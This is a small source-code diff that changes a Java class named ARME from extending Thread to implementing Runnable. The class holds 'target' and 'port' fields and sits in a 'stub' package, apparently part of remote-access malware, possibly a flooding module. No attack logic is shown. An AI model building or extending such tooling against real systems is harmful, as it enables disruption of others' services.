@@ -3,7 +3,7 @@ import java.net.Socket;
 
 import com.redpois0n.stub.Constants;
 
-public class ARME extends Thread {
+public class ARME implements Runnable {
 
 	public String target;
 	public int port;
